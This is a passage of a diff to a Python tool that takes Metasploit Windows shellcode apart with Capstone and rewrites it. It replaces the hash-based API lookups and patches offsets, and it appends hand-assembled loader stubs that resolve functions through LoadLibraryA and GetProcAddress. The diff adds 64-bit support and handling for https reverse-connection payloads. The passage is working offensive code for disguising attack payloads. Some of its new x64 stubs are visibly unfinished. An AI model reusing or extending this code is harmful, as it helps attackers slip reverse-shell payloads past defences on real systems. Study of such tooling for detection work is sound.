+                sys.stderr.write("Length of code after stripping: {0}\n".format(len(self.code)))
+                self.prestine_code = self.code
+                self.mode = CS_MODE_64
+
         else:
             if not self.dontfail:
                 sys.stderr.write("[!] No Hash API stub?? Quit! -n to override\n")
                 sys.exit(-1)
+            if self.mode == '':
+                sys.stderr.write("[!] No mode selected for this mysterious code. ")
             sys.stderr.write("[!] No Hash API stub?? Continuing...\n")
             self.prestine_code = self.code
 
         # This Regex removes the token string in https reverse connections
         m = re.search(b'\xe8.{4}/(.*?)\x00', self.code)
         if m:
+            
             self.replace_string = m.group()[5:]
             self.astring = b"\xcc" * (len(m.group()) - 5)
             self.code = re.sub(b'/(.*?)\x00', self.astring , self.code)
-            sys.stderr.write("[*] Length of offending string: {0}".format(len(self.astring)))
-            sys.stderr.write("[*] Code length after URL replacement with '\\xcc' (breaks capstone disasm): {0}".format(len(self.code)))
+            sys.stderr.write("[*] Length of offending string: {0} \n".format(hex(len(self.astring))))
+            sys.stderr.write("[*] Code length after URL replacement with '\\xcc' (breaks capstone disasm): {0}\n".format(hex(len(self.code))))
+            sys.stderr.write(str(self.code))
 
-        
     def fix_up_hardcoded_offsets(self):
+        # 6/23 update for x64
         for key, value in self.tracker_dict.items():
             if value['ebp_offset_update'] and value['bytes'] == b'\x8d\x85\xb2\x00\x00\x00':
                 offset_to_cmd = struct.pack("<I", len(self.jump_stub) + len(self.selected_payload) + len(self.stub) + 48 - 5)
@@ -762,8 +1003,16 @@ class x86_windows_metasploit:
         for key, value in self.tracker_dict.items():
 
             if value['hash_update']:
-                self.prestine_code = self.prestine_code[:key+1] + struct.pack("<I", value['hash_update']) + self.prestine_code[key+5:]
-
+                #sys.stderr.write("%s, %s\n" % (key, value))
+                # Will need to do a register check here (mov )
+                if len(value['bytes']) == 5:
+                    self.prestine_code = self.prestine_code[:key+1] + struct.pack("<I", value['hash_update']) + self.prestine_code[key+5:]
+                elif len(value['bytes']) ==6:
+                    self.prestine_code = self.prestine_code[:key+2] + struct.pack("<I", value['hash_update']) + self.prestine_code[key+6:]
+                else:
+                    sys.stderr.write('WOT NOW M8?\n')
+                    sys.exit(-1)
+    
     def print_formats(self):
         '''
         Format the output prints to stdout
@@ -835,9 +1084,9 @@ class x86_windows_metasploit:
                             for lm in value['dlls']:
                                 found = True
                                 for ig_dll in ignore_dlls:
-                                    #print("TESTING TESTing", ig_dll, lm)
+                                    
                                     if ig_dll.lower().encode('utf-8') in lm.lower().encode('utf-8'):
-                                        #print ig_dll.lower(), lm.lower()
+                                        
                                         found = False
                                 if found is True and bytes(lm, 'iso-8859-1') not in temp_lm and bytes(lm, 'iso-8859-1') not in self.dlls:
                                     sys.stderr.write('\t\t [*] {0} adds the following not already loaded dll: {1}\n'.format(dll.decode('ascii'), lm))
@@ -976,14 +1225,19 @@ class x86_windows_metasploit:
             self.gpa_found = True
         
     def decision_tree(self):
+        if self.mode == CS_MODE_32:
+            self.stubs = stubs_32(self)
+        else:
+            self.stubs = stubs_64(self)
+
         if self.targetbinary == '' and self.dll == '':
             if self.parser_stub.lower() == 'GPA'.lower():
                 sys.stderr.write("[*] Using GPA Stub\n")
-                self.selected_payload = self.gpa_parser_stub()
+                self.selected_payload = self.stubs.gpa_parser_stub()
                 self.DLL_INFO  = { 'hash': self.DLL_HASH, 'importname': 'main_module' }
             elif self.parser_stub.lower() == 'LLAGPA'.lower():
                 sys.stderr.write("[*] Using LLAGPA Stub\n")
-                self.selected_payload = self.lla_gpa_parser_stub()
+                self.selected_payload = self.stubs.lla_gpa_parser_stub()
                 self.DLL_INFO  = { 'hash': self.DLL_HASH, 'importname': 'main_module' }
             else:
                 sys.stderr.write("[!] Try providing a targetbinary (-b) or check your parser_stub option (-p)\n")
@@ -997,13 +1251,13 @@ class x86_windows_metasploit:
                 self.DLL_INFO = {'hash': self.DLL_HASH, 'importname': self.importname}
                 sys.stderr.write("[*] Using ExternGPA from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_INFO['hash']),
                     self.DLL_INFO['importname']))
-                self.selected_payload = self.loaded_gpa_iat_parser_stub()
+                self.selected_payload = self.stubs.loaded_gpa_iat_parser_stub()
             elif self.parser_stub.lower() == 'ExternLLAGPA'.lower():
                 self.hash(self.dll)
                 self.DLL_INFO = {'hash': self.DLL_HASH, 'importname': self.importname}
                 sys.stderr.write("[*] Using ExternLLAGPA from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_INFO['hash']),
                     self.DLL_INFO['importname']))
-                self.selected_payload = self.loaded_lla_gpa_parser_stub()
+                self.selected_payload = self.stubs.loaded_lla_gpa_parser_stub()
             else:
                 sys.stderr.write("[!] Check your provided parser_stub option (-p)\n")
                 sys.exit(-1)
@@ -1016,33 +1270,29 @@ class x86_windows_metasploit:
             
             if self.lla_gpa_found is True and self.parser_stub != 'GPA' and 'extern' not in self.parser_stub.lower():
                 sys.stderr.write("[*] Using LLAGPA stub\n")
-                self.selected_payload = self.lla_gpa_parser_stub()
+                self.selected_payload = self.stubs.lla_gpa_parser_stub()
                 self.DLL_INFO  = { 'hash': self.DLL_HASH, 'importname': 'main_module' }
             elif self.gpa_found is True and self.parser_stub != 'LLAGPA' and 'extern' not in self.parser_stub.lower():
                 sys.stderr.write("[*] Using GPA stub\n")
                 self.DLL_INFO  = { 'hash': self.DLL_HASH, 'importname': 'main_module' }
-                self.selected_payload = self.gpa_parser_stub()
+                self.selected_payload = self.stubs.gpa_parser_stub()
 
             elif self.lla_hash_dict != {} and self.parser_stub != 'ExternGPA':
                 DLL, self.DLL_INFO = random.choice(list(self.lla_hash_dict.items()))
                 sys.stderr.write("[!] Using ExternLLAGPA from {0}, hash: {1}, import name: {2}\n".format(DLL, hex(self.DLL_INFO['hash']), 
                     self.DLL_INFO['importname']))
-                self.selected_payload = self.loaded_lla_gpa_parser_stub()
+                self.selected_payload = self.stubs.loaded_lla_gpa_parser_stub()
             
             elif self.gpa_hash_dict != dict():
                 DLL, self.DLL_INFO = random.choice(list(self.gpa_hash_dict.items()))
                 sys.stderr.write("[!] Using ExternGPA from {0}, hash {1}, hash {2}\n".format(DLL, hex(self.DLL_INFO['hash']), 
                     self.DLL_INFO['importname']))
                 
-                self.selected_payload = self.loaded_gpa_iat_parser_stub()
+                self.selected_payload = self.stubs.loaded_gpa_iat_parser_stub()
                 # use that
             else:
                 sys.stderr.write("[!] You have no options... :( \n")
                 sys.exit()
-
-        # do decision tree based on OS and targetbinary
-        #else
-        # something exit
 
 
     def block_tracker(self):
@@ -1056,85 +1306,112 @@ class x86_windows_metasploit:
         for a_block in self.block_order:
             ebx = ''  # To track exit function
             ebp = ''
+            rbp = ''
+            rbx = ''
+            r10d = ''
             call_op = ''
             jne_op = ''
             prior_key = ''
-            #print("\t"+"@"*25)
+            
             tmp_block = OrderedDict({})
             
             for key, value in self.tracker_dict.items():
 
                 if value['blocktag'] == a_block:
-                    #print("\t[?]",key, value)
+                    
                     tmp_block[key] = value
                 
                     #if value['bytes'] == '\xc3':
-                        #print('\tFound a Ret')
+                        
 
                     if value['mnemonic'] + " " + value['op_str'] == u"call ebp": #call ebp
-                        #print("\tCall ebp")
+                        
                         # TODO: SEE BELOW find values of push ebx and and push XXXXXX
                         if self.tracker_dict[prior_key]['mnemonic'] + " " + self.tracker_dict[prior_key]['op_str'] == "push ebx": # push ebx
-                            #print("\tPush EBX:", ebx)
+                            
                             called_api, newhash = self.get_hash(ebx)
                             #self.tracker_dict[prior_key]['hash_update'] = newhash
 
-                            #print("\tCalling Function:", called_api)
+                            
                             if called_api == None:
                                 continue
                             #elif 'LoadLibraryA'.lower() not in called_api.lower() and buildcode is True: 
-                            #    print("[^] Testing success")
                             #    continue
                         elif self.tracker_dict[prior_key]['mnemonic']  == 'push': # push XXXXX
-                            #print("\tPush EBP:", ebp)
+                            
                             called_api, newhash = self.get_hash(ebp)
                             self.tracker_dict[prior_key]['hash_update'] = newhash
-                            #print("\tCalling Function:", called_api)
+                            
                             #if newhash:
 
                             if called_api == None:
                                 continue
                             #elif 'LoadLibraryA'.lower() not in called_api.lower() and buildcode is True: 
-                            #    print("[#] Testing success")
                             #    continue
 
                     elif 'mov ebx' in value['mnemonic'] + " " + value['op_str']: # mov ebx ?
-                        #print("[!!] mov ebx")
-                        #print(value['mnemonic'], "+", value['op_str'], "bytes:", value['bytes'], len(value['bytes']))
+                        
+                        
                         if len(value['bytes']) == 5:
                             ebx = hex(struct.unpack("<I", value['bytes'][1:])[0])
                         
                         #PROBABLY DON'T NEED THIS: TODO
                         called_api, newhash = self.get_hash(ebx)
                         self.tracker_dict[key]['hash_update'] = newhash
-                        #print(hex(struct.unpack("<I", asm[1:])[0]))
+                        
+
+                    elif 'mov r10d' in value['mnemonic'] + " " + value['op_str']:
+                        sys.stderr.write('mov r10d \n')
+                        #sys.stderr.write(value['mnemonic'], "+", value['op_str'], "bytes:", value['bytes'], len(value['bytes']))
+                        if len(value['bytes']) == 6:
+                            r10d = hex(struct.unpack("<I", value['bytes'][2:])[0])
+
+                        called_api, newhash = self.get_hash(r10d)
+                        self.tracker_dict[key]['hash_update'] = newhash
+
+                    elif 'mov r10' in value['mnemonic'] + " " + value['op_str']:
+                        sys.stderr.write('mov r10d \n')
+                        #sys.stderr.write(value['mnemonic'], "+", value['op_str'], "bytes:", value['bytes'], len(value['bytes']))
+                        if len(value['bytes']) == 7:
+                            r10d = hex(struct.unpack("<I", value['bytes'][3:])[0])
+
+                        called_api, newhash = self.get_hash(r10d)
+                        self.tracker_dict[key]['hash_update'] = newhash
+
+                    elif 'movabs r10' in value['mnemonic'] + " " + value['op_str']:
+                        sys.stderr.write('movabs r10d \n')
+                        if len(value['bytes']) == 10:
+                            r10d = hex(struct.unpack("<I", value['bytes'][2:6])[0])
+
+                        called_api, newhash = self.get_hash(r10d)
+                        self.tracker_dict[key]['hash_update'] = newhash
 
                     elif value['mnemonic'] == 'push' and len(value['bytes']) > 1: # push
                         ebp = value['op_str']
                     
                     elif value['mnemonic'] == 'call': #call
                         # I DON'T THINK I NEED THIS ANYMORE
-                        #print("\tHardcoded Call")
+                        
                         call_op = value['op_str']
                         called_api, newhash = self.get_hash(call_op)
                         self.tracker_dict[key]['hash_update'] = newhash
-                        #print("\tCalling Function:", called_api)
+                        
                         #if buildcode is True:
                         #    self.engine.inspect_block(tmp_block, called_api)
                         continue
                     
                     elif 'jmp' in value['mnemonic']:
-                        #print('\tA JMP', value['op_str'])
+                        
                         call_op = value['op_str']
                         called_api, newhash = self.get_hash(call_op)
                         self.tracker_dict[key]['hash_update'] = newhash
-                        #print("\tCalling Function:", called_api)
+                        
                         
                     elif 'ret' in value['mnemonic']:
-                        #print('\tA ret, ending call block')
+                        
                         call_op = value['op_str']
                         called_api, newhash = self.get_hash(call_op)
-                        #print("\tCalling Function:", called_api)
+                        
                         continue
                         
                     prior_key = key
@@ -1142,8 +1419,8 @@ class x86_windows_metasploit:
     def doit(self):
         
         sys.stderr.write("[*] Disassembling payload\n")
-        #print("*" * 16)
-        #print(self.code)
+        
+        
         
         try:
             md = Cs(self.arch, self.mode)
@@ -1159,14 +1436,17 @@ class x86_windows_metasploit:
             tmp = {}
             #initialize blocktag
             blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
-
+            
+            # this is needed for http(s) payloads
+            md.skipdata = True
+            
             for insn in md.disasm(self.code, 0):
-                #print_insn_detail(mode, insn)
-                width = 30 - len(''.join('\\x{:02x}'.format(x) for x in insn.bytes))
-                #sys.stderr.write("%s: %s\" %s %s %s\n" % (hex(insn.address), ''.join('\\x{:02x}'.format(x) for x in insn.bytes), '#'.rjust(width), insn.mnemonic, insn.op_str))
-                #print ("0x%x:\n" % (insn.address + insn.size))
+                
+                width = 50 - len(''.join('\\x{:02x}'.format(x) for x in insn.bytes))
+                sys.stderr.write("%s: %s\" %s %s %s\n" % (hex(insn.address), ''.join('\\x{:02x}'.format(x) for x in insn.bytes), '#'.rjust(width), insn.mnemonic, insn.op_str))
+                
                 #"%s" % "".join('\\x{:02x}'.format(x) for x in insn.bytes))
-                #print(insn.op_str)
+                
 
                 tmp_tracker.append([insn.bytes, insn.mnemonic, insn.op_str])
                 tmp = {'bytes': insn.bytes,
@@ -1175,24 +1455,31 @@ class x86_windows_metasploit:
                        'controlFlowTag': None,
                        'blocktag': blocktag,
                        'ebp_offset_update': False,   # True /False
+                       'rbp_offset_update': False,
                        'hash_update': None,          # Populate with the actual value
                        }
                 
                 self.tracker_dict[insn.address] = tmp
                 
                 if insn.mnemonic + " " + insn.op_str == 'call ebp':
-                    #print(tmp_tracker)
-                    #print(tmp_tracker[len(tmp_tracker)-2][1:]) 
+                    
+                    
                  
                     self.tracker.append(tmp_tracker)
                     # set new blocktag
                     tmp_tracker=[] 
                     blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                     
+                elif insn.mnemonic + ' ' + insn.op_str == 'call rbp':
+                    self.tracker.append(tmp_tracker)
+                    # set new blocktag
+                    tmp_tracker=[] 
+                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
+                    
                 elif insn.mnemonic == "call":
-                    #print("call", insn.op_str)
+                    
                     if tmp_tracker[len(tmp_tracker)-1] == 0x68:
-                        print("Found server_uri, string")
+                        sys.stderr.write("Found server_uri, string \n")
                     self.tracker.append(tmp_tracker)
                     tmp_tracker = []
                     #new blocktag
@@ -1201,7 +1488,7 @@ class x86_windows_metasploit:
                     blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                     
                 elif 'jmp' in insn.mnemonic:
-                    #print('a jmp instruction', insn.mnemonic, insn.op_str)
+                    
                     #''.join(random.choice(string.ascii_lowercase[6:]+string.ascii_uppercase[6:]) for _ in range(8))
                     #''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                     self.tracker.append(tmp_tracker)
@@ -1212,17 +1499,21 @@ class x86_windows_metasploit:
                     blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                 
                 elif 'ret' in insn.mnemonic:
-                    #print('a ret instruction', insn.mnemonic, insn.op_str)
+                    
                     self.tracker.append(tmp_tracker)
                     tmp_tracker = []
                     blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                 
                 elif 'j' in insn.mnemonic:
-                    #print('another jump, just assigning cft')
+                    
                     self.tracker_dict[insn.address]['controlFlowTag'] = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                 
+                if '[rbp' in insn.op_str:
+                    sys.stderr.write("Found a hardcoded offset for Stephen Fewers hash API reference \n")
+                    self.tracker_dict[insn.address]['rbp_offset_update'] = True
+
                 if '[ebp' in insn.op_str:
-                    #print("Found a hardcoded offset for Stephen Fewers hash API reference")
+                    
                     self.tracker_dict[insn.address]['ebp_offset_update'] = True
 
                 if blocktag not in self.block_order:
@@ -1233,19 +1524,16 @@ class x86_windows_metasploit:
             sys.stderr.write("ERROR: %s\n" % e)
             sys.exit(-1)
 
-        # Next rebuild each self.code block
-        #print("tracker:", self.tracker)
-        # Identify the api being used.
         
+        # Identify the api being used.
         self.tracker_dict = OrderedDict(sorted(self.tracker_dict.items()))
-        #print("block_order", self.block_order)
-        # Now find assign controlFLowTags
+        
+        # Now find/assign controlFLowTags
         
         self.block_tracker()    
         
         sys.stderr.write("[*] Called APIs: {0}\n".format(self.called_apis))
-        #print("self.api_hashes", self.api_hashes)
-        
+                 
         # replace API hashes with mangled hashes
         self.fix_up_mangled_hashes()
 
@@ -1286,94 +1574,205 @@ class x86_windows_metasploit:
             self.lookup_table = self.lookup_table[:m.start()+4] + struct.pack("B", d.start() - m.start()-4) + struct.pack("B", a.start() - m.start()-5) + self.lookup_table[m.start()+6:]
         
         # Find and select IAT parser here:
+        # set 32 vs 64 bit MODE here
         self.decision_tree()
 
         # This is the stub that is appended to the IAT parser
+        # set 32 vs 64 bit MODE HERE
         sys.stderr.write("[*] Assembling lookup table stub\n")
-        self.stub = b''
-        self.stub += b"\xe9"
-        self.stub += struct.pack("<I", len(self.lookup_table))
-        
-        self.stub += self.lookup_table
+        if self.mode == CS_MODE_32:
 
-        table_offset = len(self.stub) - len(self.lookup_table)
-        
-        self.stub += b"\x33\xC0"                            # XOR EAX,EAX                    ; clear eax
-        self.stub += b"\xE8\x00\x00\x00\x00"                # CALL $+5                       ; get PC
-        self.stub += b"\x5E"                                # POP ESI                        ; current EIP loc in ESI                   
-        self.stub += b"\x8B\x8E"                            # MOV ECX, DWORD PTR [ESI+XX]    ; MOV 1st Hash into ECX
-        
-        # updated offset
-        updated_offset = 0xFFFFFFFF - len(self.stub) - table_offset + 14 
-        
-        # Check_hash
-        self.stub += struct.pack("<I", 0xffffffff-len(self.stub) - table_offset + 14)
-        self.stub += b"\x3B\x4C\x24\x24"                    # CMP ECX,DWORD PTR SS:[ESP+24]  ; check if hash in lookup table
-        self.stub += b"\x74\x05"                            # JE SHORT 001C0191              ; if equal, jmp to found_a_match
-        self.stub += b"\x83\xC6\x06"                        # ADD ESI,6                      ; else increment to next hash
-        self.stub += b"\xEB\xEF"                            # JMP SHORT 001C0191             ; repeat
-        # FOUND_A_MATCH
-        self.stub += b'\x8B\x8E'                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; mov DLL offset to ECX
-        self.stub += struct.pack("<I", updated_offset + 4)
-        self.stub += b"\x8A\xC1"                            # MOV AL,CL                      ; OFFSET in CL, mov to AL
-        # Get DLL and Call LLA for DLL Block
-        self.stub += b"\x8B\xCE"                            # MOV ECX,ESI                    ; mov offset to ecx
-        self.stub += b"\x03\xC8"                            # ADD ECX,EAX                    ; find DLL location
-        self.stub += b"\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
-        self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3))
-        sys.stderr.write("Test: {0}".format(self.DLL_INFO['importname']))
-        if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
-            self.stub += b"\x33\xC0"                        # XOR EAX,EAX
-            self.stub += b"\x50"                            # PUSH EAX
-            self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
-        
-        elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
-            self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
+            self.stub = b''
+            self.stub += b"\xe9"
+            self.stub += struct.pack("<I", len(self.lookup_table))
+            
+            self.stub += self.lookup_table
+
+            table_offset = len(self.stub) - len(self.lookup_table)
+            
+            self.stub += b"\x33\xC0"                            # XOR EAX,EAX                    ; clear eax
+            self.stub += b"\xE8\x00\x00\x00\x00"                # CALL $+5                       ; get PC
+            self.stub += b"\x5E"                                # POP ESI                        ; current EIP loc in ESI                   
+            self.stub += b"\x8B\x8E"                            # MOV ECX, DWORD PTR [ESI+XX]    ; MOV 1st Hash into ECX
+            
+            # updated offset
+            updated_offset = 0xFFFFFFFF - len(self.stub) - table_offset + 14 
+            
+            # Check_hash
+            self.stub += struct.pack("<I", 0xffffffff-len(self.stub) - table_offset + 14)
+            self.stub += b"\x3B\x4C\x24\x24"                    # CMP ECX,DWORD PTR SS:[ESP+24]  ; check if hash in lookup table
+            self.stub += b"\x74\x05"                            # JE SHORT 001C0191              ; if equal, jmp to found_a_match
+            self.stub += b"\x83\xC6\x06"                        # ADD ESI,6                      ; else increment to next hash
+            self.stub += b"\xEB\xEF"                            # JMP SHORT 001C0191             ; repeat
+            # FOUND_A_MATCH
+            self.stub += b'\x8B\x8E'                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; mov DLL offset to ECX
+            self.stub += struct.pack("<I", updated_offset + 4)
+            self.stub += b"\x8A\xC1"                            # MOV AL,CL                      ; OFFSET in CL, mov to AL
+            # Get DLL and Call LLA for DLL Block
+            self.stub += b"\x8B\xCE"                            # MOV ECX,ESI                    ; mov offset to ecx
+            self.stub += b"\x03\xC8"                            # ADD ECX,EAX                    ; find DLL location
+            self.stub += b"\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
+            self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3))
+            
+            sys.stderr.write("Test: {0}".format(self.DLL_INFO['importname']))
+            if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
+                self.stub += b"\x33\xC0"                        # XOR EAX,EAX
+                self.stub += b"\x50"                            # PUSH EAX
+                self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
+            
+            elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
+                self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
+            
+            else:
+                sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
+                sys.exit(-1)
+     
+            
+            self.stub += b"\xFF\x13"                            # CALL DWORD PTR DS:[EBX]        ; Call KERNEL32.LoadLibraryA (DLL)
+            # Get API and Call GPA
+            self.stub += b"\x8B\xD0"                            # MOV EDX,EAX                    ; Save DLL Handle to EDX
+            if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
+                self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use
+                self.stub += b"\x50"                            # push EAX
+            elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
+                self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use    
+            else:
+                sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
+                sys.exit(-1)
+            self.stub += b"\x8B\x8E"                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; Put API Offset in ECX
+            self.stub += struct.pack("<I", updated_offset + 4)  
+            self.stub += b"\x8A\xC5"                            # MOV AL,CH                      ; mov API offset to ECX
+            self.stub += b"\x8B\xCE"                            # MOV ECX,ESI                    ; mov offset to ecx
+            self.stub += b"\x03\xC8"                            # ADD ECX,EAX                    ; find API location
+            self.stub += b"\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
+            self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff + 4))
+            self.stub += b"\x51"                                # PUSH ECX                       ; Push API on the stack
+            self.stub += b"\x52"                                # PUSH EDX                       ; Push DLL handle on the stack
+            self.stub += b"\xFF\x55\x00"                        # CALL DWORD PTR DS:[EBP]        ; Call Getprocaddress(DLL.handle, API)
+            # Call API
+            self.stub += b"\x89\x44\x24\x1C"                    # MOV DWORD PTR SS:[ESP+1C],EAX  ; SAVE EAX for popad ends up in eax
+            self.stub += b"\x61"                                # POPAD                          ; Restore registers and call values
+            self.stub += b"\x5D"                                # POP EBP                        ; get return addr
+            self.stub += b"\x59"                                # POP ECX                        ; clear Hash API from msf caller 
+            self.stub += b"\xFF\xD0"                            # CALL EAX                       ; call target API
+            # Recover
+            self.stub += b"\x55"                                # push ebp                       ; push return addr into msf caller
+            self.stub += b"\xe8\x00\x00\x00\x00"                # call $+5                       ; get pc
+            self.stub += b"\x5D"                                # POP EBP                        ; current EIP in EBP
+            self.stub += b"\x81\xED"                            # SUB EBP,XX                     ; To reset the location of the api call back
+            self.stub += struct.pack("<I", len(self.selected_payload)+ len(self.stub) -3)   
+            self.stub += b"\xC3"                                # RETN                           ; return back into msf payload logic
+
+
+            self.jump_stub = b"\xe8"
+            self.jump_stub += struct.pack("<I", len(self.selected_payload) + len(self.stub))
         
         else:
-            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
-            sys.exit(-1)
- 
-        
-        self.stub += b"\xFF\x13"                            # CALL DWORD PTR DS:[EBX]        ; Call KERNEL32.LoadLibraryA (DLL)
-        # Get API and Call GPA
-        self.stub += b"\x8B\xD0"                            # MOV EDX,EAX                    ; Save DLL Handle to EDX
-        if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
-            self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use
-            self.stub += b"\x50"                            # push EAX
-        elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
-            self.stub += b"\x33\xC0"                        # XOR EAX,EAX                    ; Prep EAX for use    
-        else:
-            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
-            sys.exit(-1)
-        self.stub += b"\x8B\x8E"                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; Put API Offset in ECX
-        self.stub += struct.pack("<I", updated_offset + 4)  
-        self.stub += b"\x8A\xC5"                            # MOV AL,CH                      ; mov API offset to ECX
-        self.stub += b"\x8B\xCE"                            # MOV ECX,ESI                    ; mov offset to ecx
-        self.stub += b"\x03\xC8"                            # ADD ECX,EAX                    ; find API location
-        self.stub += b"\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
-        self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff + 4))
-        self.stub += b"\x51"                                # PUSH ECX                       ; Push API on the stack
-        self.stub += b"\x52"                                # PUSH EDX                       ; Push DLL handle on the stack
-        self.stub += b"\xFF\x55\x00"                        # CALL DWORD PTR DS:[EDX]        ; Call Getprocaddress(DLL.handle, API)
-        # Call API
-        self.stub += b"\x89\x44\x24\x1C"                    # MOV DWORD PTR SS:[ESP+1C],EAX  ; SAVE EAX for popad ends up in eax
-        self.stub += b"\x61"                                # POPAD                          ; Restore registers and call values
-        self.stub += b"\x5D"                                # POP EBP                        ; get return addr
-        self.stub += b"\x59"                                # POP ECX                        ; clear Hash API from msf caller 
-        self.stub += b"\xFF\xD0"                            # CALL EAX                       ; call target API
-        # Recover
-        self.stub += b"\x55"                                # push ebp                       ; push return addr into msf caller
-        self.stub += b"\xe8\x00\x00\x00\x00"                # call $+5                       ; get pc
-        self.stub += b"\x5D"                                # POP EBP                        ; current EIP in EBP
-        self.stub += b"\x81\xED"                            # SUB EBP,XX                     ; To reset the location of the api call back
-        self.stub += struct.pack("<I", len(self.selected_payload)+ len(self.stub) -3)   
-        self.stub += b"\xC3"                                # RETN                           ; return back into msf payload logic
+            # 64 bit
+            # I'll need to move this around for x64 calling convention (RCX, RDX, R8, R9)
+
+            self.stub = b''
+            self.stub += b"\xe9"
+            self.stub += struct.pack("<I", len(self.lookup_table))
+            
+            self.stub += self.lookup_table
+
+            table_offset = len(self.stub) - len(self.lookup_table)
+            
+            self.stub += b"\x33\xC0"                            # XOR EAX,EAX                    ; clear eax
+            self.stub += b"\xE8\x00\x00\x00\x00"                # CALL $+5                       ; get PC
+            self.stub += b"\x5E"                                # POP ESI                        ; current EIP loc in ESI                   
+            self.stub += b"\x8B\x8E"                            # MOV ECX, DWORD PTR [ESI+XX]    ; MOV 1st Hash into ECX
+            
+            # updated offset
+            updated_offset = 0xFFFFFFFF - len(self.stub) - table_offset + 14 
+            
+            # Check_hash
+            self.stub += struct.pack("<I", 0xffffffff-len(self.stub) - table_offset + 14)
+            self.stub += b"\x44\x39\xD1"                        # CMP ecx, r10d  
+            
+            self.stub += b"\x74\x06"                            # JE SHORT 001C01a1              ; if equal, jmp to found_a_match
+            self.stub += b"\x48\x83\xC6\x06"                        # ADD RSI,6                      ; else increment to next hash
+            # I think this is the right updated length
+            self.stub += b"\xEB\xEF"                            # JMP SHORT 001C0191             ; repeat
+            # FOUND_A_MATCH
+            self.stub += b'\x8B\x8E'                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; mov DLL offset to ECX
+            self.stub += struct.pack("<I", updated_offset + 4)
+            self.stub += b"\x8A\xC1"                            # MOV AL,CL                      ; OFFSET in CL, mov to AL
+            # Get DLL and Call LLA for DLL Block
+            self.stub += b"\x48\x89\xF1"                            # MOV RCX,RSI                    ; mov offset to ecx
+            self.stub += b"\x48\x01\xC1"                            # ADD RCX,RAX                    ; find DLL location
+            self.stub += b"\x48\x81\xE9"                            # SUB RCX,XX                     ; normalize for ascii value
+            self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3))
+            
+            sys.stderr.write("Test: {0}".format(self.DLL_INFO['importname']))
+            if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
+                self.stub += b"\x48\x31\xD2"                        # XOR rdx,rdx
+                # will need to be updated
+                #self.stub += b"\x50"                            # PUSH EAX
+                #self.stub += b"\x51"                            # PUSH ECX                       ; push on stack for use
+            
+            elif self.DLL_INFO['importname'].lower() == 'kernel32.dll' or self.DLL_INFO['importname'] == 'main_module' or self.parser_stub == 'ExternGPA':
+                # no need for pushing on stack
+                self.stub += b""                            # PUSH ECX                       ; push on stack for use
+            
+            else:
+                sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
+                sys.exit(-1)
+     
+            
+            self.stub += b"\x48\x83\xEC\x20"                        # sub rsp, 0x20
+            self.stub += b"\xFF\x13"                                # CALL DWORD PTR DS:[RBX]        ; Call KERNEL32.LoadLibraryA (DLL)
+            # Get API and Call GPA
+            
+            self.stub += b"\x48\x89\xC2"                            # MOV RDX,RAX                    ; Save DLL Handle to EDX
+            if 'api-ms-win-core-libraryloader' in self.DLL_INFO['importname'].lower() and self.parser_stub == 'ExternLLAGPA':
